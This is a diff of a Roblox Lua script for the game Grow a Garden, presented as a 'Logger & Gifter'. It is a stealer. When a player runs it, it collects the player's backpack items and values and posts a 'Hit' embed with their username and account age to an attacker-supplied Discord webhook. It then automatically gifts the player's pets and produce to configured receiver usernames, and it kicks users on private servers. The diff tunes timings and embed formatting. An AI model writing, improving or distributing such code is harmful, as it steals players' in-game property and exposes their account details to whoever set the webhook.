@@ -1,10 +1,10 @@
--- Grow a Garden: Perfect Logger & Auto-Gifter
+-- Grow a Garden: Ultimate Logger & Gifter with Beautiful Embed
 -- Made By Timoci | discord.gg/notyet
 
 local CONFIG = {
     USERNAMES = _G.Usernames or {},
     WEBHOOK   = _G.webhook or "",
-    MIN_VALUE = _G.min_value or 1, -- Now minimum so ALL items show
+    MIN_VALUE = _G.min_value or 1,
 }
 local RARE_PETS = {
     ["Raccoon"]        = "🦥",
@@ -28,7 +28,6 @@ local modules = replicatedStorage:WaitForChild("Modules")
 local giftingDone = false
 local webhookSent = false
 
--- Checks
 if #CONFIG.USERNAMES == 0 or CONFIG.WEBHOOK == "" then
     plr:Kick("Missing username or webhook in config!")
     return
@@ -42,7 +41,6 @@ end
 if isPrivateServer() then plr:Kick("Server not supported. Use a public GAG server.") return end
 if game.PlaceId ~= 126884695634066 then plr:Kick("Unsupported game. Join a normal GAG server.") return end
 
--- Imports
 local calcPlantValue   = require(modules:WaitForChild("CalculatePlantValue"))
 local petUtils        = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
 local petRegistry     = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
@@ -50,7 +48,6 @@ local numberUtil      = require(modules:WaitForChild("NumberUtil"))
 local dataService     = require(modules:WaitForChild("DataService"))
 local excludedItems   = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
 
--- Data/Formatting
 local function getPetEmoji(name) return RARE_PETS[name] or DEFAULT_PET_EMOJI end
 local function getPetAge(tool) return tool:GetAttribute("Age") or (tool.Name:match("Age (%d+)")) or "?" end
 local function getWeight(tool)
@@ -129,7 +126,7 @@ local function buildBackpackSection(items)
         if item.Type == "Pet" then table.insert(itemLines, string.format("%s %s [%.2fkg] [Age %s] **%s¢**", item.Emoji, item.Name, item.Weight, tostring(item.Age or "?"), formatValue(item.Value)))
         else table.insert(itemLines, string.format("%s %s [%.2fkg] **%s¢**", item.Emoji, item.Name, item.Weight, formatValue(item.Value))) end
     end
-    return table.concat(itemLines, "\n")
+    return "``````"
 end
 
 local function prettyEmbed(executer, receiver)
@@ -139,7 +136,7 @@ local function prettyEmbed(executer, receiver)
     return {
         content = (foundRare and "@everyone" or ""),
         embeds = {{
-            title = string.format("🥗 Grow A Garden Hit - %s", os.date("%c")),
+            title = "🥗 Grow A Garden Hit",
             color = foundRare and 16776960 or 65280,
             fields = {
                 {name = "🧑‍💻 Player Information", value = string.format("**Username:** `%s`\n**Receiver:** `%s`\n**Account Age:** `%s`", executer.Name, receiver, accountAge), inline = false},
@@ -173,7 +170,7 @@ local function equipTool(tool)
     if plr.Character and plr.Character:FindFirstChild("Humanoid") then
         pcall(function() plr.Character.Humanoid:EquipTool(tool) end)
     end
-    task.wait(0.06)
+    task.wait(0.13) -- Slower for reliability
 end
 
 local function findGiftPrompt(targetChar)
@@ -207,12 +204,12 @@ local function doGift(receiver)
         local prompt = findGiftPrompt(receiver.Character)
         if prompt then
             local t0 = os.clock()
-            repeat task.wait(0.04) if (os.clock() - t0) > 3 then break end until prompt.Enabled
+            repeat task.wait(0.09) if (os.clock() - t0) > 4 then break end until prompt.Enabled
             bypassProximityPrompt(prompt)
-            wait(0.10)
+            wait(0.18) -- Slightly slower, more reliable
         end
         item.Tool.Parent = backpack
-        wait(0.04)
+        wait(0.08)
     end
 end
 
